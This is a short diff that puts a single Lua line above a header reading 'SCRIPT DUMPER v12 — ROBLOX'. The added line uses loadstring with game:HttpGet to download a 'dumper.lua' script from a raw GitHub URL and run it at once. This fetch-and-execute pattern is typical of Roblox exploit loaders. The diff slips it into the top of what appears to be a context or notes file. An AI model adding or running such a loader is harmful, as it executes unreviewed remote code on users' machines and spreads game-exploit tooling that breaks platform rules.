@@ -1,3 +1,7 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rendays666/New-loader/refs/heads/main/script-maker/dumper.lua"))()
+
+
+
 ==============================================================
 KONTEKS: SCRIPT DUMPER v12 — ROBLOX
 ==============================================================
